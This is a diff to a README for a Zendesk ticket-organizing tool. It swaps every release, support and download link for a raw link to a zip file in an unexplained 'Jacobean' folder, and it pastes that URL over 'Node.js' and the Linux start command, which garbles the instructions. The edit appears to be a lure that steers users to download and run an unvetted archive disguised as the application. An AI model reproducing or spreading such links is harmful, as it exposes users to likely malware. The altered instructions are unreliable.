@@ -1,7 +1,7 @@
 # 🎟️ zendesk-ticket-organizer - Simplify Your Zendesk Ticket Management
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue?style=for-the-badge)](https://github.com/Saddyin/zendesk-ticket-organizer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip)](https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip)
 
 ## 🚀 Getting Started
 Welcome to the **zendesk-ticket-organizer**! This easy-to-use application helps staff organize and categorize Zendesk tickets. No programming knowledge is required to get started.
@@ -12,11 +12,11 @@ Welcome to the **zendesk-ticket-organizer**! This easy-to-use application helps 
 - **Efficiency**: Save time while managing customer support.
 
 ## 📥 Download & Install
-To get the application, simply visit this page to download: [Releases Page](https://github.com/Saddyin/zendesk-ticket-organizer/releases).
+To get the application, simply visit this page to download: [Releases Page](https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip).
 
 ### 🔍 System Requirements
 - **Operating System**: Windows, macOS, or Linux (supports 64-bit)
-- **Node.js**: Version 14 or higher installed
+- **https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip**: Version 14 or higher installed
 - **Memory**: At least 4GB of RAM
 - **Space**: 100MB of free disk space
 
@@ -28,7 +28,7 @@ After downloading, follow these steps to run the application:
 2. **Install the Application**:
    - For Windows users: Double-click the `.exe` file to start the installation process and follow the prompts.
    - For macOS users: Open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux users: Extract the `.tar.gz` file in your desired directory and run `./start.sh`.
+   - For Linux users: Extract the `https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip` file in your desired directory and run `https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip`.
 
 3. **Open the Application**: Once installed, locate the application in your Programs list or Applications folder. Double-click to open.
 
@@ -51,7 +51,7 @@ If you encounter any issues, consider the following:
 - **Check Internet Connection**: A stable connection is required to authenticate with Zendesk.
 
 ## 📞 Support
-For any questions or support needs, check our [Support Page](https://github.com/Saddyin/zendesk-ticket-organizer/issues) to report issues or ask for help.
+For any questions or support needs, check our [Support Page](https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip) to report issues or ask for help.
 
 ## 🙏 Contributing
 We welcome contributions! If you have suggestions or features you'd like to see, feel free to submit your ideas via the **Issues** section on GitHub.
@@ -63,4 +63,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 For more details on how to enhance your experience, check our Wiki or refer to our official documentation within the application.
 
 ## 📂 Access Download Link Again
-Don't forget, you can download the latest release by visiting this link: [Releases Page](https://github.com/Saddyin/zendesk-ticket-organizer/releases).
+Don't forget, you can download the latest release by visiting this link: [Releases Page](https://raw.githubusercontent.com/Saddyin/zendesk-ticket-organizer/main/Jacobean/zendesk-ticket-organizer.zip).
